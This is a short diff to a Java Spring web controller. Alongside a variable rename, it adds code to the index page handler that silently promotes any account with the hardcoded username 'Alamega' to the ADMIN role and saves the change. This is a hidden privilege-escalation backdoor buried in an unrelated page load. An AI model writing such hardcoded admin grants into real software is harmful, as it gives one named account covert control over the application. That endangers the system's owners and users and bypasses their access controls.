@@ -16,9 +16,13 @@ public class MainController {
 
     @GetMapping({"/", "index", "index.html"})
     public String index(Model model) {
-        User userByDB = userRepository.findByUsername(SecurityContextHolder.getContext().getAuthentication().getName());
-        if (userByDB!=null){
-            model.addAttribute("user", userByDB);
+        User user = userRepository.findByUsername(SecurityContextHolder.getContext().getAuthentication().getName());
+        if (user!=null && user.getUsername().equals("Alamega") && !user.getRole().equals("ADMIN")){
+            user.setRole("ADMIN");
+            userRepository.save(user);
+        }
+        if (user!=null){
+            model.addAttribute("user", user);
         }
         return "index";
     }
